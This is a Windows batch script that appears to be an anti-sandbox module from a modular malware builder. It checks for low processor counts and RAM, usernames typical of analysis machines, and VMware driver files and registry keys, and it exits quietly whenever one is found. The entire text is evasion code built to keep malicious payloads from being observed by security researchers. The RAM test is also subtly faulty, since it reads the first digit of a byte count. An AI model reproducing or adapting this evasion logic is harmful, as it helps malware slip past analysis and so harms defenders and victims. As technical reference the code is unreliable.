REM provides: evasion_anti_sandbox
REM depends: (none)
REM description: Detect sandbox/VM environments and exit if detected

REM Check processor count (sandboxes often have 1-2 cores)
if "%NUMBER_OF_PROCESSORS%" LEQ "2" (
    exit /b 0
)

REM Check RAM via wmic (sandboxes often have low RAM)
for /f "tokens=2 delims==" %%m in ('wmic computersystem get TotalPhysicalMemory /value 2^>nul ^| findstr "="') do (
    set "RAM_BYTES=%%m"
)
REM Rough check: if RAM string is short, likely < 4GB
if defined RAM_BYTES (
    if "%RAM_BYTES:~0,1%"=="1" exit /b 0
    if "%RAM_BYTES:~0,1%"=="2" exit /b 0
    if "%RAM_BYTES:~0,1%"=="3" exit /b 0
)

REM Check for common sandbox usernames
echo %USERNAME% | findstr /i "sandbox malware virus test sample john" >nul 2>nul && exit /b 0

REM Check for common VM artifacts
if exist "C:\windows\system32\drivers\vmmouse.sys" exit /b 0
if exist "C:\windows\system32\drivers\vmhgfs.sys" exit /b 0
reg query "HKLM\SOFTWARE\VMware, Inc.\VMware Tools" >nul 2>nul && exit /b 0
